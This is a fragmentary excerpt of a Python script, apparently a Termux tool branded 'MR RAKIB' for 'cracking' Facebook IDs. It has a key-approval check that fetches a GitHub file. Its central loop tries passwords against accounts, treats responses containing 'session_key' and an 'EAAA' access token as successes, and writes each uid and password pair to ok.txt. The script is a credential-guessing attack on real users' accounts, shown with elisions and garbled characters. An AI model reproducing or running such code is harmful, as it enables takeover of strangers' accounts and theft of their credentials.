...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/MRRAKIB-404/Mr/blob/main/appro.txt"])
...
def notice():
	...
	runtxt("\033[0;97m Key Approval Ke MR RAKIB >> %s%s"%(G,basesplit))
...
class Main:
	...
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/MRRAKIB-404/Mr/blob/main/appro.txt').text
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook  :  MD RAKIB HOSSEN \x1b[0m\x1b[1;97m]
...
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€Ã— 
    ...
    """)
		...
		print("%s [%s1%s]%s CRACK  FB IDZ 2009-11 {JUST NOW} %s(MR RAKIB-Clonning)"%(G,R,G,Y,B))
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[0;97m   [MR RAKIB-OK=>] %s | %s\033[0;97m         "%(uid, pw))

				self.ok.append("%s|%s"%(uid, pw))

				open("ok.txt","a").write("   [MR RAKIB-OK=>]  %s|%s\n"%(uid, pw))
